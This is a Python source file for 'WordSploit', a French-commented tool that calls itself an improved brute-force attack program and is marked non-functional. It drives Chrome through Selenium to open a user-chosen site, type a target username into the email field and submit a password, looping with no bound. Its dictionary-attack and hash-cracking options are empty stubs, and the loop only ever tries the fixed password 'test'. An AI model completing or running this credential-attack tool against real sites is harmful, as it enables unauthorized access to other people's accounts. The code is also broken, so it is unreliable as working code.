import platform
import time
from selenium import webdriver
from selenium.webdriver.support.ui import Select
from selenium.webdriver.common.keys import Keys

# - Programme par: Keany Vy KHUN
# - Sous Licence : MIT
# - Projet: WordSploit
# - Description: Programme d'attaque par force brute amélioré
# - Status: Non fonctionnel

chrome_options = webdriver.ChromeOptions()
#chrome_options.add_argument("--headless")
chrome_options.add_argument("--log-level=3")
driver = webdriver.Chrome(r"chromedriver.exe", options=chrome_options)
driver.set_window_size(1024, 650)
webdriver.ChromeOptions().add_argument("--disable-popup-blocking")
webdriver.ChromeOptions().add_argument("--disable-extensions")

print('''
 __      __                .____________      .__         .__  __
/  \    /  \___________  __| _/   _____/_____ |  |   ____ |__|/  |_
\   \/\/   /  _ \_  __ \/ __ |\_____  \ ____ \|  |  /  _ \|  \   __\ \
\n \        (  <_> )  | \/ /_/ |/        \  |_> >  |_(  <_> )  ||  |
  \__/\  / \____/|__|  \____ /_______  /   __/|____/\____/|__||__|
       \/                   \/       \/|__|

    --- Développé par Keany Vy KHUN ---
''')

def prevent():
    print('Ordinateur:', platform.platform())
    print('Nom:', platform.node())
    print('Processeur:', platform.processor())

def main():
    methode = input("""\n
1 - Attaque par force brute
2 - Attaque par dicionnaire
3 - Déchiffrement de Hash
4 - Quitter

Veuillez entrer un nombre : """)

    if methode == "1":
        method_1()
    elif methode == "2":
        method_2()
    elif methode == "3":
        method_3()
    elif methode == "4":
        method_4()
    else:
        erreur()

def method_1():
    target = input("\nEntrez un site : ")
    driver.get(target)
    global username
    username = input("\nEntrez un nom d'utilisateur : ")
    brute_force()

def brute_force():
    global username
    time.sleep(2)
    driver.find_element_by_xpath('//*[@name="email"]').send_keys(username)
    time.sleep(2)
    driver.find_element_by_xpath('//*[@type="password"]').send_keys("test", Keys.ENTER)
    time.sleep(2)
    brute_force()
    close_chrome()

def method_2():
    print('method 2')

def method_3():
    print('method 3')

def method_4():
    quit()

def erreur():
    print('Entrez un nombre valide.')

def close_chrome():
    driver.delete_all_cookies()
    driver.close()

if __name__ == "__main__":
    prevent()
    main()
